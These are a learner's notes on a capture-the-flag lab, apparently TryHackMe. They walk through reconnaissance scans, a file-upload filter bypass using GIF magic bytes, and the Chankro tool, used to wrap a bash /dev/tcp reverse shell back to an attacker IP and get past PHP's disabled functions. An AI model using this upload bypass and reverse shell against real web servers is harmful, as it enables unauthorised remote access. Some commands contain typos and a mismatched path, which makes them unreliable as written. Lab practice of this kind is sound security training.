# Bypass Disable Functions

> Structured cybersecurity study notes converted from the source DOCX. Commands, indicators, answers, and investigation pivots are preserved for rapid reference.

Practice bypassing disabled dangerous features that run operating system commands or start processes.
## NMAP -A

```text
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 1f:97:54:30:24:74:f2:fa:15:ed:f3:35:84:dc:6c:d0 (RSA)
| 256 a7:21:78:6d:a6:05:7e:5a:0f:7e:53:65:0a:c4:53:49 (ECDSA)
|_ 256 57:1c:22:ac:59:69:62:cb:94:bd:e9:9f:67:68:23:c9 (EdDSA)
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Ecorp - Jobs
MAC Address: 02:8C:99:00:36:BF (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

## DIRB

- **Reference:** dirb http://10.10.205.35 /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
- -- Scanning URL: http://10.10.205.35/ ----
```text
==> DIRECTORY: http://10.10.205.35/assets/
+ http://10.10.205.35/index.html (CODE:200|SIZE:12012)
+ http://10.10.205.35/phpinfo.php (CODE:200|SIZE:68244)
+ http://10.10.205.35/server-status (CODE:403|SIZE:277)
==> DIRECTORY: http://10.10.205.35/uploads/
```

- -- Entering directory: http://10.10.205.35/assets/ ----
```text
(!) WARNING: Directory IS LISTABLE. No need to scan it.
```

(Use mode '-w' if you want to scan it anyway)
- -- Entering directory: http://10.10.205.35/uploads/ ----
```text
(!) WARNING: Directory IS LISTABLE. No need to scan it.
```

(Use mode '-w' if you want to scan it anyway)
## READ THE PHPINFO.PHP FILE

- Apache version 2.4.18
- Apache api version 20120211
- user/group: www-data(33)/33
- server root: /etc/apache2
- "input Validation and Filtering: enabled
- path to send mail: "usr/sbin/sendmail -t -i"
- Document_Root: /var/www/html/fa5fba5f5a39d27d8bb7fe5f515e00db
## IDENTIFY UPLOAD LOCATION

- downloaded typical safe jpg from google and uploaded it to the site
- upload images go to "uploads" directory: 10.10.205.35/uploads
## START THE NETCAT LISTENER ON THE SAME PORT AS PUT INTO THE SHELL

## ATTEMPT UPLOAD WEB SHELL

- found a reverse webshell on the tryhackme VM
- copied to desktop and gave it a short name
- edited the file to add my attacker machine IP and port
- created several versions: rsh.php; rsh.jpg; rsh.jpg.php; rsh.php.jpg
- tried to upload all, but none would upload
## EDIT MAGIC BYTES

- choose the shell.php file and submit
- in the Burpsuite proxy at "GIF87a" on the same line as but before the <?php
- the line looks like "GIF 87a <?php"
- this inserts the GIF magic bytes into the encoding
- results in positive feedback
## ACTIVATE THE REVERSE SHELL

- input the URL where uploads are going <IP>/uploads/ and saw the file
- attempted to activate the shell by putting the name of the shell file into the address bar
- received an error the connection refused; netcat received the connection request, but netcat terminated and returned to the command prompt… interesting
## ACTIVATE CHANKRO

- git clone https://github.com/TarlogicSecurity/Chankro.git
- cd Chankro
- phython2 chankro.py --help
- establish command based on the required parameters
- arch (32 or 64)
- input (file with payload to execute)
- output (name of the php file that you will upload)
- path: specify the full path where the uploaded PHP file is located, this is the full server path, not the url path; this means the Document_root from the phpinfo file
- Create a simple text file with a very basic shell
- touch SimpleShell.sh
- add the shell command to the file:
#!/bin/bash
Bash -i >& /dev/tcp/<attacker IP>/<attacker port> 0>&1
- **Command:** `python2 chankro.py --arch 64 --input SimpleShell.sh --output AttackShell.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads`
- creates a much more complicated shell file
-
## REUPLOAD ATTACKERSHELL.PHP USING THE MAGIC BYTES METHOD

- start the netcat listener
- open the AttackShell.php and get the reverse shell
- the task is to find the "flag.txt" file
- **Command:** `find / -name flag.txt 2>/dev/null`
